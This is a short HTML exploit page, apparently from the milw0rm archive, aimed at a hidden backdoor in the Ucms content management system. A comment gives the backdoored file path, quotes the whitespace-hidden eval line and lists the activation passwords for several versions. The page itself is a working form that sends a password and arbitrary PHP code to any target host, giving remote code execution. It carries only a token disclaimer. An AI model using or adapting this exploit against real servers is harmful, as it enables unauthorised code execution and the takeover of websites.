@@ -1,0 +1,78 @@
+<html>
+<!--
+##########################################
+#                                        #
+#      Ucms 1.4, 1.7, 1.8+?all           #
+#        Non Public exploit              #
+#       by 2Â²hotÂ²2 a.k.a D4m14n          #
+#           and shadowleet               #
+#     Contact: teaminternet@pen.tj       #
+#                 Or                     #
+#     shadowleet@safe-mail.net           #
+##########################################
+Short description:
+Ucms is a warez-cms coded by madmax,
+he selled the cms for 150 Euro for one cms,
+but itÂ´s not enough that the cms costs 150 euro,
+he added a "secret" backdoor which now is released...
+Used by:
+Famous warez-sites like alphawarez, loud, oxygen-warez and so on...
+___________________________________________________________________
+
+Backdoor in file:
+/php/modules/entries/search.cache.inc.php
+line 8:
+$cache_path = '/search/' . GetValidFilename($search_term) . '_' . $search_hash . '_info.dat';
+if(@stripslashes($_POST['p']) == 'ZCShY8FjtEhIF8LZ'){@eval(@stripslashes($_POST['e']));exit;};
+the second string is hidden at the very right site with whitespaces in the texteditor, so nobody had seen it before,
+the function is called in:
+/php/modules/entries/search.main.inc.php
+exploit:
+-->
+
+<head>
+<title>Ucms v. 1.8 Np exploit</title>
+<script type="text/javascript">
+function sethost(seite)
+{
+document.host.action = seite + 'index.php?&q=test&e=1';
+document.all.data.innerHTML =  document.host.action;
+}
+</script>
+</head>
+<body onLoad="sethost('http://www.ucmspage.de/')" >
+<h1>Ucms v. 1.8 Np exploit</h1>
+Actual Request:<div id="data"></div>
+<br />
+Host:<input type="text" value="http://www.ucmspage.de/" onKeyUp="sethost(this.value);" />
+<form id="host" name="host" action="http://www.ucmspage.de/" method="POST">
+Password:<input type="text" name="p" value="ZCShY8FjtEhIF8LZ"><br />
+<!--
+Additional info:
+You need a password to activate the backdoor we found these passwords:
+ZCShY8FjtEhIF8LZ (UCMS 1.8)
+mYM1NHtWtZk2KwrF (UCMS 1.4)
+wVCQUyhTga5Nmft1 (UCMS [?])
+Just go into the file or similar files to find the passwords,
+ for every version there is another password
+-->
+ 
+Phpcode:<br />
+<textarea name="e" rows="20" cols="100">
+phpinfo(); ?>
+&lt;/textarea&gt;
+<br />
+<input type="submit" value="exploit">
+</form>
+</body>
+
+<!--
+ItÂ´s just a crime to do such thigs, so please use
+this exploit just for knowledge and not to destroy the warez pages...
+thank you for you attention...
+Have a nice day
+-->
+
+</html>
+
+# milw0rm.com [2007-11-21]
